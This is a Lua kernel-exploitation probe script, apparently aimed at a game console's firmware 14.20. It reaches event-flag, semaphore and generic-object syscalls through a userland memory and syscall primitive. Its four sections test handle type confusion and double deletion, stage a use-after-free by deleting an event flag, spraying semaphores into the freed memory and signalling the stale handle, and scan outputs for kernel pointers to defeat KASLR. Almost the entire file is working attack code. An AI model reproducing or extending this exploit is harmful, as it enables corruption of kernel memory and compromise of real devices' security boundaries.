-- CRASH_CLASS: MODERATE
-- PROBE 222a: Handle namespace type confusion — KASLR + heap corruption
--
-- Context: Decompiled handler analysis reveals 5 subsystems share process+0xc48
-- handle namespace with ZERO credential checks:
--   Event flags  (type 0x110): sys 538-546 — create/open/signal/wait/poll/clear/cancel
--   Semaphores   (type 0x120): sys 549-556 — create/open/wait/post/cancel
--   Generic objs (type arg|0x1000): sys 557 — creates 0x18-byte records
--   Handle delete: sys 558 — deletes any object by handle+type
--   AIO subsystem: sys 662-670 — also uses process+0xc48 domain
--
-- NEVER TESTED on any firmware.
--
-- Attack strategy:
--   1. Create event flags and semaphores → verify handle namespace behavior
--   2. Create generic 0x18-byte objects via sys 557 → test type confusion
--   3. Cross-subsystem: create EF → delete → spray semaphores → signal stale EF
--   4. Scan ALL outputs for kernel pointer patterns (0xFFFF8xxx)
--
-- Handle recycling: after 8 reuses, handle generation wraps (upstream finding)
--
-- Section A: Event flag + semaphore reachability (create, signal, poll, delete)
-- Section B: sys 557/558 generic objects + handle reuse + type spoofing
-- Section C: Cross-subsystem UAF — create→delete→spray→stale-signal
-- Section D: Full output scan across all IPC operations for KASLR

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 222a: HANDLE NAMESPACE TYPE CONFUSION ===")
print("Section: " .. TEST_SECTION)
print("Firmware: 14.20")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end
local function is_kptr(val)
    local h, l = get_hi_lo(val)
    if h >= 0xFFFF8000 and h <= 0xFFFFFFFE then return true end
    return false
end
local function scan_buf(base, size, label)
    local found = 0
    for off = 0, size - 8, 8 do
        local val = safe_rq(base + off)
        if val then
            local h, l = get_hi_lo(val)
            if is_kptr(val) then
                found = found + 1
                print(string.format("  [KPTR!] %s +0x%03X = %s", label, off, fmt(val)))
            elseif h ~= 0 or l ~= 0 then
                print(string.format("  [data]  %s +0x%03X = %s", label, off, fmt(val)))
            end
        end
    end
    return found
end

-- Syscall constructors
local sc538 = make_syscall(538)  -- evf_create
local sc539 = make_syscall(539)  -- evf_delete
local sc540 = make_syscall(540)  -- evf_open
local sc541 = make_syscall(541)  -- evf_close
local sc542 = make_syscall(542)  -- evf_wait
local sc543 = make_syscall(543)  -- evf_trywait
local sc544 = make_syscall(544)  -- evf_set (signal)
local sc545 = make_syscall(545)  -- evf_clear
local sc546 = make_syscall(546)  -- evf_cancel

local sc549 = make_syscall(549)  -- osem_create
local sc550 = make_syscall(550)  -- osem_delete
local sc551 = make_syscall(551)  -- osem_open
local sc552 = make_syscall(552)  -- osem_close
local sc553 = make_syscall(553)  -- osem_wait
local sc554 = make_syscall(554)  -- osem_trywait
local sc555 = make_syscall(555)  -- osem_post
local sc556 = make_syscall(556)  -- osem_cancel

local sc557 = make_syscall(557)  -- namedobj_create
local sc558 = make_syscall(558)  -- namedobj_delete

local sc624 = make_syscall(624)  -- VM timestamp
local sc20  = make_syscall(20)   -- getpid

print("pid=" .. to_num(sc20()))
local vm_base = to_num(sc624())
print("vm_timestamp_baseline=" .. vm_base)

if TEST_SECTION == "A" then
    print("--- Section A: Event flag + semaphore reachability ---")
    print("")

    -- Allocate name buffer + output buffer
    local namebuf = memory.alloc(0x100)
    local outbuf  = memory.alloc(0x100)
    local name_addr = namebuf
    local out_addr  = outbuf

    -- Write a name string "test_ef\0"
    local function write_name(addr, s)
        for i = 1, #s do
            pcall(function() memory.write_dword(addr + i - 1,
                string.byte(s, i) + (i + 1 <= #s and string.byte(s, i+1) * 256 or 0) +
                (i + 2 <= #s and string.byte(s, i+2) * 65536 or 0) +
                (i + 3 <= #s and string.byte(s, i+3) * 16777216 or 0)
            ) end)
        end
    end

    -- Simple name: write "evf1\0" as dword
    pcall(function() memory.write_dword(name_addr, 0x31667665) end)  -- "evf1"
    pcall(function() memory.write_dword(name_addr + 4, 0) end)       -- null term

    -- ========================================
    -- EVENT FLAGS (sys 538-546)
    -- ========================================
    print("=== EVENT FLAGS (sys 538-546) ===")

    -- sys 538 (evf_create): create event flag
    -- Expected args: name_ptr, flags/attrs, init_pattern
    print("")
    print("[TEST] sys 538 evf_create(name, 0, 0)")
    local ok1, rv1 = pcall(function() return sc538(name_addr, 0, 0) end)
    print("  ok=" .. tostring(ok1) .. " rv=" .. (ok1 and fmt(rv1) or tostring(rv1)))
    local ef_handle = ok1 and to_num(rv1) or nil

    -- Try with different attr values
    print("[TEST] sys 538 evf_create(name, 0x110, 0)")
    pcall(function() memory.write_dword(name_addr, 0x32667665) end)  -- "evf2"
    pcall(function() memory.write_dword(name_addr + 4, 0) end)
    local ok1b, rv1b = pcall(function() return sc538(name_addr, 0x110, 0) end)
    print("  ok=" .. tostring(ok1b) .. " rv=" .. (ok1b and fmt(rv1b) or tostring(rv1b)))

    -- Try with just zero args (no name)
    print("[TEST] sys 538 evf_create(0, 0, 0)")
    local ok1c, rv1c = pcall(function() return sc538(0, 0, 0) end)
    print("  ok=" .. tostring(ok1c) .. " rv=" .. (ok1c and fmt(rv1c) or tostring(rv1c)))

    -- sys 544 (evf_set): signal event flag
    if ef_handle and ef_handle > 0 then
        print("")
        print("[TEST] sys 544 evf_set(handle=" .. ef_handle .. ", pattern=0xFF)")
        local ok2, rv2 = pcall(function() return sc544(ef_handle, 0xFF) end)
        print("  ok=" .. tostring(ok2) .. " rv=" .. (ok2 and fmt(rv2) or tostring(rv2)))

        -- sys 543 (evf_trywait): poll event flag
        -- Args likely: handle, pattern, mode, output_ptr
        for i = 0, 0xF, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end
        print("[TEST] sys 543 evf_trywait(handle=" .. ef_handle .. ", 0xFF, 0, output)")
        local ok3, rv3 = pcall(function() return sc543(ef_handle, 0xFF, 0, out_addr) end)
        print("  ok=" .. tostring(ok3) .. " rv=" .. (ok3 and fmt(rv3) or tostring(rv3)))
        if ok3 then
            print("  output:")
            scan_buf(out_addr, 0x20, "evf_trywait")
        end

        -- sys 545 (evf_clear): clear bits
        print("[TEST] sys 545 evf_clear(handle=" .. ef_handle .. ", 0xFF)")
        local ok4, rv4 = pcall(function() return sc545(ef_handle, 0xFF) end)
        print("  ok=" .. tostring(ok4) .. " rv=" .. (ok4 and fmt(rv4) or tostring(rv4)))
    end

    -- ========================================
    -- SEMAPHORES (sys 549-556)
    -- ========================================
    print("")
    print("=== SEMAPHORES (sys 549-556) ===")

    pcall(function() memory.write_dword(name_addr, 0x316D6573) end)  -- "sem1"
    pcall(function() memory.write_dword(name_addr + 4, 0) end)

    -- sys 549 (osem_create): create semaphore
    -- Expected args: name_ptr, flags/attrs, init_count, max_count
    print("[TEST] sys 549 osem_create(name, 0, 1, 10)")
    local ok5, rv5 = pcall(function() return sc549(name_addr, 0, 1, 10) end)
    print("  ok=" .. tostring(ok5) .. " rv=" .. (ok5 and fmt(rv5) or tostring(rv5)))
    local sem_handle = ok5 and to_num(rv5) or nil

    -- Try with zero args
    print("[TEST] sys 549 osem_create(0, 0, 1, 1)")
    local ok5b, rv5b = pcall(function() return sc549(0, 0, 1, 1) end)
    print("  ok=" .. tostring(ok5b) .. " rv=" .. (ok5b and fmt(rv5b) or tostring(rv5b)))

    -- sys 555 (osem_post): increment semaphore
    if sem_handle and sem_handle > 0 then
        print("[TEST] sys 555 osem_post(handle=" .. sem_handle .. ")")
        local ok6, rv6 = pcall(function() return sc555(sem_handle) end)
        print("  ok=" .. tostring(ok6) .. " rv=" .. (ok6 and fmt(rv6) or tostring(rv6)))

        -- sys 554 (osem_trywait): non-blocking wait
        print("[TEST] sys 554 osem_trywait(handle=" .. sem_handle .. ")")
        local ok7, rv7 = pcall(function() return sc554(sem_handle) end)
        print("  ok=" .. tostring(ok7) .. " rv=" .. (ok7 and fmt(rv7) or tostring(rv7)))
    end

    -- ========================================
    -- HANDLE TRACKING
    -- ========================================
    print("")
    print("=== HANDLE VALUE ANALYSIS ===")
    print("  ef_handle=" .. tostring(ef_handle))
    print("  sem_handle=" .. tostring(sem_handle))
    if ef_handle and sem_handle then
        print("  delta=" .. (sem_handle - ef_handle))
        print("  (sequential handles suggest shared namespace)")
    end

    print("")
    local vm_end = to_num(sc624())
    print("vm_timestamp_delta=" .. (vm_end - vm_base))
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: sys 557/558 generic objects + type spoofing ---")
    print("")

    local namebuf = memory.alloc(0x100)
    local outbuf  = memory.alloc(0x100)
    local name_addr = namebuf
    local out_addr  = outbuf

    -- ========================================
    -- SYS 557 (namedobj_create): generic 0x18-byte object
    -- ========================================
    print("=== SYS 557 — GENERIC OBJECT CREATION ===")

    -- Args for sys 557: name_ptr, type_selector (ORed with 0x1000 internally)
    -- If type = 0x110 → becomes 0x1110 → different from native event flag 0x110
    -- If type = 0x120 → becomes 0x1120 → different from native semaphore 0x120
    -- If type = 0 → becomes 0x1000

    pcall(function() memory.write_dword(name_addr, 0x316A626F) end)  -- "obj1"
    pcall(function() memory.write_dword(name_addr + 4, 0) end)

    local handles_557 = {}

    -- Test with various type values
    for _, typ in ipairs({0, 1, 0x10, 0x100, 0x110, 0x120, 0x160, 0xFFF}) do
        -- Need unique name per object
        pcall(function() memory.write_dword(name_addr,
            0x6A626F00 + typ) end)  -- varies
        pcall(function() memory.write_dword(name_addr + 4, 0) end)

        local ok, rv = pcall(function() return sc557(name_addr, typ) end)
        local rv_num = ok and to_num(rv) or nil
        print(string.format("  type=0x%03X: ok=%s rv=%s", typ,
            tostring(ok), ok and fmt(rv) or tostring(rv)))
        if rv_num and rv_num > 0 then
            table.insert(handles_557, { handle = rv_num, typ = typ })
        end
    end

    -- ========================================
    -- SYS 558 (namedobj_delete): delete by handle + type
    -- ========================================
    print("")
    print("=== SYS 558 — HANDLE DELETION ===")

    -- Test deletion with matching type
    if #handles_557 > 0 then
        local test_h = handles_557[1]
        print(string.format("[TEST] sys 558 delete(handle=%d, type=0x%X)",
            test_h.handle, test_h.typ))
        local ok_d, rv_d = pcall(function() return sc558(test_h.handle, test_h.typ) end)
        print("  ok=" .. tostring(ok_d) .. " rv=" .. (ok_d and fmt(rv_d) or tostring(rv_d)))

        -- Try deleting same handle again (should fail = not found)
        print("[TEST] sys 558 delete same handle again (double-free test)")
        local ok_dd, rv_dd = pcall(function() return sc558(test_h.handle, test_h.typ) end)
        print("  ok=" .. tostring(ok_dd) .. " rv=" .. (ok_dd and fmt(rv_dd) or tostring(rv_dd)))
    end

    -- Test cross-type deletion: create with type A, delete with type B
    print("")
    print("=== CROSS-TYPE DELETION ===")

    -- Create event flag
    pcall(function() memory.write_dword(name_addr, 0x33667665) end)  -- "evf3"
    pcall(function() memory.write_dword(name_addr + 4, 0) end)
    local ok_ef, rv_ef = pcall(function() return sc538(name_addr, 0, 0) end)
    local ef_h = ok_ef and to_num(rv_ef) or nil
    print("  Created EF: handle=" .. tostring(ef_h) .. " (type 0x110)")

    if ef_h and ef_h > 0 then
        -- Try deleting EF handle with semaphore type (0x120)
        print("[TEST] sys 558 delete EF handle with type=0x120 (sem)")
        local ok_x1, rv_x1 = pcall(function() return sc558(ef_h, 0x120) end)
        print("  ok=" .. tostring(ok_x1) .. " rv=" .. (ok_x1 and fmt(rv_x1) or tostring(rv_x1)))

        -- Try deleting EF handle with generic type (0x1000)
        print("[TEST] sys 558 delete EF handle with type=0x1000 (generic)")
        local ok_x2, rv_x2 = pcall(function() return sc558(ef_h, 0x1000) end)
        print("  ok=" .. tostring(ok_x2) .. " rv=" .. (ok_x2 and fmt(rv_x2) or tostring(rv_x2)))

        -- Try deleting EF with correct type (0x110)
        print("[TEST] sys 558 delete EF handle with type=0x110 (correct)")
        local ok_x3, rv_x3 = pcall(function() return sc558(ef_h, 0x110) end)
        print("  ok=" .. tostring(ok_x3) .. " rv=" .. (ok_x3 and fmt(rv_x3) or tostring(rv_x3)))
    end

    -- ========================================
    -- HANDLE RECYCLING TEST
    -- ========================================
    print("")
    print("=== HANDLE RECYCLING ===")
    local recycled = {}
    for round = 1, 12 do
        pcall(function() memory.write_dword(name_addr,
            0x63790000 + round) end)
        pcall(function() memory.write_dword(name_addr + 4, 0) end)

        -- Create
        local ok_c, rv_c = pcall(function() return sc557(name_addr, 0) end)
        local h = ok_c and to_num(rv_c) or nil

        -- Immediately delete
        if h and h > 0 then
            pcall(function() return sc558(h, 0) end)
        end

        table.insert(recycled, h or 0)
        print(string.format("  round %2d: handle=%s", round, tostring(h)))
    end

    -- Check for handle reuse
    local seen = {}
    local reused_count = 0
    for _, h in ipairs(recycled) do
        if seen[h] then
            reused_count = reused_count + 1
        end
        seen[h] = true
    end
    print("  Handle reuse detected: " .. reused_count .. " times")
    if reused_count > 0 then
        print("  *** HANDLE RECYCLING CONFIRMED — UAF possible ***")
    end

    print("")
    local vm_end = to_num(sc624())
    print("vm_timestamp_delta=" .. (vm_end - vm_base))
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: Cross-subsystem UAF — create→delete→spray→stale-signal ---")
    print("")
    print("WARNING: This section attempts controlled heap corruption.")
    print("         Process crash is expected if UAF succeeds.")
    print("")

    local namebuf = memory.alloc(0x100)
    local outbuf  = memory.alloc(0x200)
    local name_addr = namebuf
    local out_addr  = outbuf

    -- Step 1: Create event flag
    pcall(function() memory.write_dword(name_addr, 0x31616675) end)  -- "uaf1"
    pcall(function() memory.write_dword(name_addr + 4, 0) end)

    print("[STEP 1] Create event flag")
    local ok1, rv1 = pcall(function() return sc538(name_addr, 0, 0) end)
    local ef_handle = ok1 and to_num(rv1) or nil
    print("  ef_handle=" .. tostring(ef_handle) .. " rv=" .. (ok1 and fmt(rv1) or tostring(rv1)))

    if not ef_handle or ef_handle <= 0 then
        print("  Cannot create event flag, testing alternative: zero-arg create")
        ok1, rv1 = pcall(function() return sc538(0, 0, 0) end)
        ef_handle = ok1 and to_num(rv1) or nil
        print("  ef_handle=" .. tostring(ef_handle))
    end

    -- Step 2: Record the event flag handle, then delete it
    if ef_handle and ef_handle > 0 then
        print("")
        print("[STEP 2] Delete event flag — memory freed, handle becomes stale")
        local ok2, rv2 = pcall(function() return sc539(ef_handle) end)
        print("  delete rv=" .. (ok2 and fmt(rv2) or tostring(rv2)))

        -- Step 3: Spray semaphores to reclaim freed memory
        print("")
        print("[STEP 3] Spray 16 semaphores to reclaim freed EF memory")
        local sem_handles = {}
        for i = 1, 16 do
            pcall(function() memory.write_dword(name_addr,
                0x6D657300 + i) end)  -- "sem" + i
            pcall(function() memory.write_dword(name_addr + 4, 0) end)

            local ok_s, rv_s = pcall(function() return sc549(name_addr, 0, 1, 100) end)
            local sh = ok_s and to_num(rv_s) or nil
            if sh and sh > 0 then table.insert(sem_handles, sh) end
        end
        print("  Created " .. #sem_handles .. " semaphores")
        for i, sh in ipairs(sem_handles) do
            if i <= 5 then print(string.format("    sem[%d] handle=%d", i, sh)) end
        end

        -- Step 4: Try to signal the STALE event flag handle
        -- If the freed EF memory was reclaimed by a semaphore, this write goes
        -- into the semaphore's internal structure at wrong offsets
        print("")
        print("[STEP 4] Signal STALE event flag handle=" .. ef_handle)
        print("  If this succeeds (rv=0): the freed memory was reclaimed and")
        print("  we're writing into a semaphore structure at EF offsets = TYPE CONFUSION")

        for i = 0, 0x3F, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end

        local ok4, rv4 = pcall(function() return sc544(ef_handle, 0xFFFF) end)
        print("  evf_set rv=" .. (ok4 and fmt(rv4) or tostring(rv4)))

        if ok4 and to_num(rv4) == 0 then
            print("  *** STALE SIGNAL SUCCEEDED — TYPE CONFUSION CONFIRMED ***")
            print("  *** Checking semaphores for corruption: ***")

            -- Check if any semaphore is now corrupted
            for i, sh in ipairs(sem_handles) do
                local ok_tw, rv_tw = pcall(function() return sc554(sh) end)
                local ok_p, rv_p = pcall(function() return sc555(sh) end)
                print(string.format("    sem[%d] handle=%d: trywait=%s post=%s",
                    i, sh,
                    ok_tw and fmt(rv_tw) or "fail",
                    ok_p and fmt(rv_p) or "fail"))
            end
        else
            print("  Stale signal failed — checking error code")
            -- The error code tells us about handle validation
            -- 3 = handle not found (strong isolation)
            -- 0x16 = type mismatch (weak isolation, handle found)
            local rv_num = ok4 and to_num(rv4) or -1
            print(string.format("  Error code: %d (0x%X)", rv_num, rv_num))
            if rv_num == 3 then
                print("  Handle invalidated on delete (STRONG isolation)")
            elseif rv_num == 0x16 then
                print("  Handle found but type mismatch (WEAK isolation — exploitable!)")
            end
        end

        -- Step 5: Try evf_trywait on stale handle (READ from freed/reclaimed memory)
        print("")
        print("[STEP 5] evf_trywait on stale handle (read from reclaimed memory)")
        for i = 0, 0x3F, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end
        local ok5, rv5 = pcall(function() return sc543(ef_handle, 0xFFFFFFFF, 0, out_addr) end)
        print("  evf_trywait rv=" .. (ok5 and fmt(rv5) or tostring(rv5)))
        if ok5 then
            print("  Output buffer (potential kernel pointer leak):")
            local kp = scan_buf(out_addr, 0x40, "stale_trywait")
            if kp > 0 then
                print("  *** KASLR DEFEAT: kernel pointers leaked via stale handle! ***")
            end
        end

        -- Cleanup: delete semaphores
        print("")
        print("[CLEANUP] Deleting semaphores")
        for _, sh in ipairs(sem_handles) do
            pcall(function() return sc550(sh) end)
        end
    else
        print("Cannot create event flag — testing sys 557/558 alternative path")

        -- Fallback: use sys 557 generic objects
        print("")
        print("[FALLBACK] sys 557 generic create + sys 558 delete + spray")
        pcall(function() memory.write_dword(name_addr, 0x316E6567) end)  -- "gen1"
        pcall(function() memory.write_dword(name_addr + 4, 0) end)

        local ok_g, rv_g = pcall(function() return sc557(name_addr, 0) end)
        local gen_h = ok_g and to_num(rv_g) or nil
        print("  generic handle=" .. tostring(gen_h))

        if gen_h and gen_h > 0 then
            -- Delete it
            pcall(function() return sc558(gen_h, 0) end)
            print("  deleted generic object")

            -- Spray more generics
            for i = 1, 16 do
                pcall(function() memory.write_dword(name_addr, 0x70730000 + i) end)
                pcall(function() memory.write_dword(name_addr + 4, 0) end)
                pcall(function() return sc557(name_addr, 0) end)
            end
            print("  sprayed 16 generic objects")

            -- Try to access stale handle via event flag operations
            local ok_s, rv_s = pcall(function() return sc544(gen_h, 0xFF) end)
            print("  evf_set on stale generic: " .. (ok_s and fmt(rv_s) or tostring(rv_s)))
        end
    end

    print("")
    local vm_end = to_num(sc624())
    print("vm_timestamp_delta=" .. (vm_end - vm_base))
    print("[DONE] Section C complete")

elseif TEST_SECTION == "D" then
    print("--- Section D: Systematic output scan across ALL IPC ops ---")
    print("")

    local namebuf = memory.alloc(0x100)
    local outbuf  = memory.alloc(0x200)
    local name_addr = namebuf
    local out_addr  = outbuf
    local total_kptrs = 0

    -- Create event flag
    pcall(function() memory.write_dword(name_addr, 0x31706964) end)  -- "dip1"
    pcall(function() memory.write_dword(name_addr + 4, 0) end)
    local ok_ef, rv_ef = pcall(function() return sc538(name_addr, 0, 0) end)
    local ef_h = ok_ef and to_num(rv_ef) or nil
    print("ef_handle=" .. tostring(ef_h))

    -- Create semaphore
    pcall(function() memory.write_dword(name_addr, 0x32706964) end)  -- "dip2"
    pcall(function() memory.write_dword(name_addr + 4, 0) end)
    local ok_sm, rv_sm = pcall(function() return sc549(name_addr, 0, 5, 100) end)
    local sem_h = ok_sm and to_num(rv_sm) or nil
    print("sem_handle=" .. tostring(sem_h))

    -- Create generic object
    pcall(function() memory.write_dword(name_addr, 0x33706964) end)  -- "dip3"
    pcall(function() memory.write_dword(name_addr + 4, 0) end)
    local ok_gn, rv_gn = pcall(function() return sc557(name_addr, 0) end)
    local gen_h = ok_gn and to_num(rv_gn) or nil
    print("gen_handle=" .. tostring(gen_h))

    -- For each operation that has output: scan for kernel pointers
    local tests = {}

    -- Event flag operations with output
    if ef_h and ef_h > 0 then
        -- Signal first
        pcall(function() return sc544(ef_h, 0xAAAABBBB) end)

        -- evf_trywait (has output parameter)
        table.insert(tests, {
            name = "evf_trywait",
            fn = function() return sc543(ef_h, 0xFFFFFFFF, 0, out_addr) end
        })

        -- evf_set returns old pattern
        table.insert(tests, {
            name = "evf_set(pattern=1)",
            fn = function() return sc544(ef_h, 1) end
        })

        -- evf_clear returns old pattern
        table.insert(tests, {
            name = "evf_clear(mask=0)",
            fn = function() return sc545(ef_h, 0) end
        })

        -- evf_cancel (may have output)
        table.insert(tests, {
            name = "evf_cancel",
            fn = function() return sc546(ef_h, 0, out_addr) end
        })
    end

    -- Semaphore operations
    if sem_h and sem_h > 0 then
        table.insert(tests, {
            name = "osem_trywait",
            fn = function() return sc554(sem_h) end
        })
        table.insert(tests, {
            name = "osem_post",
            fn = function() return sc555(sem_h) end
        })
        table.insert(tests, {
            name = "osem_cancel",
            fn = function() return sc556(sem_h, 0, out_addr) end
        })
    end

    -- Run each test, scan output buffer and return value
    for _, test in ipairs(tests) do
        -- Zero output buffer
        for i = 0, 0x7F, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end

        local ok, rv = pcall(test.fn)
        print(string.format("\n[%s] ok=%s rv=%s", test.name, tostring(ok),
            ok and fmt(rv) or tostring(rv)))

        -- Check return value itself
        if ok and rv then
            if is_kptr(rv) then
                total_kptrs = total_kptrs + 1
                print("  *** RETURN VALUE IS KERNEL POINTER: " .. fmt(rv) .. " ***")
            end
        end

        -- Scan output buffer
        local kp = scan_buf(out_addr, 0x80, test.name)
        total_kptrs = total_kptrs + kp
    end

    -- Additional: try evf_open and osem_open (read existing objects by name)
    print("\n=== OPEN OPERATIONS (name-based lookup) ===")

    -- evf_open: open existing event flag by name
    pcall(function() memory.write_dword(name_addr, 0x31706964) end)  -- same name as created
    pcall(function() memory.write_dword(name_addr + 4, 0) end)
    for i = 0, 0x3F, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end
    local ok_eo, rv_eo = pcall(function() return sc540(name_addr, 0) end)
    print("[evf_open] ok=" .. tostring(ok_eo) .. " rv=" .. (ok_eo and fmt(rv_eo) or tostring(rv_eo)))
    if ok_eo and is_kptr(rv_eo) then
        total_kptrs = total_kptrs + 1
        print("  *** KERNEL POINTER IN RETURN ***")
    end

    -- osem_open
    pcall(function() memory.write_dword(name_addr, 0x32706964) end)
    pcall(function() memory.write_dword(name_addr + 4, 0) end)
    local ok_so, rv_so = pcall(function() return sc551(name_addr, 0) end)
    print("[osem_open] ok=" .. tostring(ok_so) .. " rv=" .. (ok_so and fmt(rv_so) or tostring(rv_so)))
    if ok_so and is_kptr(rv_so) then
        total_kptrs = total_kptrs + 1
        print("  *** KERNEL POINTER IN RETURN ***")
    end

    -- Cleanup
    if ef_h and ef_h > 0 then pcall(function() return sc539(ef_h) end) end
    if sem_h and sem_h > 0 then pcall(function() return sc550(sem_h) end) end
    if gen_h and gen_h > 0 then pcall(function() return sc558(gen_h, 0) end) end

    print("\n=== TOTAL KERNEL POINTERS FOUND: " .. total_kptrs .. " ===")
    if total_kptrs > 0 then
        print("*** KASLR DEFEAT via IPC handle operations! ***")
    end

    print("")
    local vm_end = to_num(sc624())
    print("vm_timestamp_delta=" .. (vm_end - vm_base))
    print("[DONE] Section D complete")
end
